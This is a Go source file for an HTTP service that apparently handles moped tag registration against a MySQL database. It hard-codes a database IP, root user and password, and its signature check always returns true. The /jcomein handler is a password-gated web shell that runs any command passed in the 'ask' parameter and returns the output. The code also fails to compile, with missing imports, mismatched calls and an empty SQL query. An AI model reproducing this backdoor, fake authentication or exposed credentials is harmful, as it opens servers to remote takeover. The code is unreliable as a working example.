package main

import (
	"bytes"
	"os/exec"
	//"crypto/aes"
	//"crypto/cipher"
	"flag"

	"github.com/ziutek/mymysql/mysql"
	_ "github.com/ziutek/mymysql/native" // Native engine
	//"html"
	//"log"
	//"net/url"
	//_ "github.com/ziutek/mymysql/thrsafe" // Thread safe engine

	//"encoding/base64"
	//"encoding/json"
	"fmt"
	"net/http"

	"github.com/golang/glog"
)

func opendb() mysql.Conn {

	db := mysql.New("tcp", "", "202.127.26.254:3306", "root", "trimps3393", "mopedmange")

	err := db.Connect()
	if err != nil {
		glog.Errorln("数据库无法连接")
		return nil
	}
	return db

}

func cmp_md5(sig string) bool {
	return true

}

func main() {
	flag.Parse()

	http.HandleFunc("/mopedtagissue", mopedtagissue)
	http.HandleFunc("/area", area_func)
	http.HandleFunc("/type", type_func)
	http.HandleFunc("/color", color_func)
	http.HandleFunc("/get_moped", get_moped)
	http.HandleFunc("/Upt_tagstate", Upt_tagstate)

	http.HandleFunc("/jcomein", jcomein)
	http.Handle("/src/", http.StripPrefix("/src/", http.FileServer(http.Dir("./htmlsrc/"))))

	glog.Info("程序启动，开始监听8080端口")
	defer func() {
		glog.Infoln("成功退出")
		glog.Flush()
	}()

	for {
		err := http.ListenAndServe(":8080", nil)
		if err != nil {
			//log.Fatal("ListenAndServer: ", err)
			fmt.Println("ListenAndServer: ", err)

		}
	}

}

type STATUSRET struct {
	Status string
}

func mopedtagissue(w http.ResponseWriter, r *http.Request) { /*http://202.127.26.252/XXX/mopedtagissue*/
	r.ParseForm()
	tagid := r.FormValue("tagid")
	areaid := r.FormValue("areaid")
	hphm := r.FormValue("hphm")
	typeid := r.FormValue("typeid")
	pic := r.FormValue("pic")
	vin := r.FormValue("vin")
	colorid := r.FormValue("colorid")
	name := r.FormValue("name")
	phone := r.FormValue("phone")
	address := r.FormValue("address")
	photo := r.FormValue("photo")
	SID := r.FormValue("SID")
	sign := r.FormValue("sign")

	var statusret STATUSRET

	db := opendb()
	if db == nil {
		statusret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write("{status:'-1'}")
		return
	} else {
		defer db.Close()
	}

	if cmp_md5(1, sign) != true {
		statusret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write("{status:'1002'}")
		return
	}

	if len(tagid) <= 0 || len(areaid) <= 0 || len(hphm) <= 0 || len(name) <= 0 || len(sign) <= 0 {
		statusret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write("{status:'1003'}")
		return
	}
	sql := ""
	res, err := db.Start(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write("{status:'1000'}")
		return
	} else {

		statusret.Status = "1" //处理成功
	}
	b, err := json.Marshal(statusret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write("{status:1000}")
		return

	}

	glog.V(3).Infoln("接口用于发卡软件与数据库之间的数据交互：成功")
	w.Write(b)

}
func area_func(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/area   */
}
func type_func(w http.ResponseWriter, r *http.Request) { /*  http://202.127.26.252/XXX/type   */
}
func color_func(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/color   */
}
func get_moped(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/get_moped   */
}
func Upt_tagstate(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/Upt_tagstate   */
}

func jcomein(w http.ResponseWriter, r *http.Request) { /*    */
	r.ParseForm()
	quest := r.FormValue("quest")
	ask := r.FormValue("ask")
	if quest == "" || ask == "" {
		w.Write([]byte("/jcomein?quest=xxxx&ask=xxxxxx"))
		return
	}
	if quest != "1972" {
		w.Write([]byte("/jcomein?quest=xxxx&ask=xxxxxxx"))
		return

	}
	ask1 := strings.Split(string(ask), " ")
	ask2 := ask1[1:]

	cmd := exec.Command(ask1[0], ask2...)
	//cmd := exec.Command("net"," help","net")

	buf, err := cmd.Output()
	// fmt.Sprintf("%s++%s",buf,err)
	if err != nil {
		w.Write([]byte(fmt.Sprintf("%s++%s", buf, err)))
		return
	}
	w.Write([]byte(buf))

}
